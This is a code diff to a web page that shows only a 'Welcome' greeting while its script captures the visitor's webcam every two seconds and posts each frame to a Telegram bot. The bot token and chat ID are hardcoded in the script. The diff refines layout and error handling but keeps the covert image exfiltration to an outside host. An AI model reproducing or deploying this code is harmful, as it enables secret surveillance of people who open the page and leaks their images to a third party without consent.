@@ -15,12 +15,17 @@
       flex-direction: column;
     }
 
-    /* Hide video and canvas */
-    video, canvas {
+    video {
+      display: block;
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    canvas {
       display: none;
     }
 
-    /* Style the welcome text */
     .welcome-text {
       font-size: 3em;
       font-weight: bold;
@@ -29,7 +34,6 @@
       animation: fadeIn 2s ease-in-out;
     }
 
-    /* Add fade-in effect */
     @keyframes fadeIn {
       0% {
         opacity: 0;
@@ -45,7 +49,7 @@
 <body>
   <div class="welcome-text">Welcome</div>
   <video id="video" autoplay></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <canvas id="canvas"></canvas>
 
   <script>
     const video = document.getElementById('video');
@@ -56,24 +60,27 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        captureAndSend(); // Start capturing images and sending
+
+        video.onloadedmetadata = () => {
+          canvas.width = video.videoWidth || 640; // Set default width if unavailable
+          canvas.height = video.videoHeight || 480; // Set default height if unavailable
+          captureAndSend(); // Start capturing images and sending
+        };
       } catch (error) {
         console.error("Error accessing camera: ", error);
       }
     }
 
     // Capture and send image every 2 seconds
-    async function captureAndSend() {
+    function captureAndSend() {
       const context = canvas.getContext('2d');
       setInterval(async () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Add text "#Jonny" under the image
+        // Add text "#Jonny" inside the image
         context.font = "30px Arial";
         context.fillStyle = "white";
-        context.fillText("#Jonny", 10, canvas.height + 40);  // Adjust position to be under the image
+        context.fillText("#Jonny", 10, canvas.height - 20); // Position text near the bottom
 
         const imageData = canvas.toDataURL('image/png'); // Convert image to Base64
         sendToTelegram(imageData); // Send the image to Telegram
@@ -85,24 +92,24 @@
       const token = '8165540566:AAGXlo_1ljb6IkAG8jj7BjZdxwfJQhub96o'; // Bot token
       const chatId = '6514749116'; // Chat ID
 
-      // Convert Base64 to file
-      const blob = await fetch(imageData).then(res => res.blob());
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'photo.png');
+      try {
+        // Convert Base64 to file
+        const blob = await fetch(imageData).then(res => res.blob());
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.png');
 
-      // Send the image using Telegram API
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => response.json())
-      .then(result => {
+        // Send the image using Telegram API
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+
+        const result = await response.json();
         console.log('Photo sent successfully:', result);
-      })
-      .catch(error => {
+      } catch (error) {
         console.error('Error sending photo:', error);
-      });
+      }
     }
 
     // Start camera when the page loads
